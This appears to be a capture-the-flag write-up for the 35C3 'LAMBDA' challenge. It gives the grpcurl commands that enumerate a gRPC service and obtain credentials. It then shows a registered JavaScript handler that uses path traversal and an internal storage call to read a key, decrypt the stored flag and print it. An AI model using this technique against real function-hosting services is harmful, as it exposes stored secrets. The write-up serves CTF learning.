# LAMBDA

1)

```shell
⇒  grpcurl -insecure 35.207.157.20:443 list
c3.Lambda
grpc.reflection.v1alpha.ServerReflection
```

2)
```shell
⇒  grpcurl -insecure 35.207.157.20:443 list c3.Lambda
c3.Lambda.Auth
c3.Lambda.ListHandlers
c3.Lambda.RegisterHandler
c3.Lambda.Signup
```

3)
```shell
⇒  grpcurl -insecure 35.207.157.20:443 c3.Lambda/Signup
{
  "cid": "56df926161f7",
  "token": "dad72cb568a124f74988b9b22db062c18871adf0f8c516650ca238e96eff14c0"
 }
```

4)
```shell
⇒  python lambda.py
grpcurl -insecure -d '{"creds":{"cid": "56df926161f7", "token": "dad72cb568a124f74988b9b22db062c18871adf0f8c516650ca238e96eff14c0"},"handler":{"endpoint": "diofeher","code":"function handle(args) {var flag = GetStorage(\"../espr/flag\");var key = _getmapex(\"espr/data/key\");console.log(\"getmapex(key)\", key);console.log(\"flag decrypted\", sjcl.decrypt(key, flag));console.log(\"flag\", flag);return {status: 200, response: \"\", code:this._getmapex}}"}}' 35.207.157.20:443 c3.Lambda/RegisterHandler
#
{
  "result": true,
  "message": "handler registered access at /56df926161f7/diofeher"
}
```

5)

```shell
Access it: https://35.207.157.20/56df926161f7/diofeher

35C3_WePutV8InEverything_FlagLeakedOops
```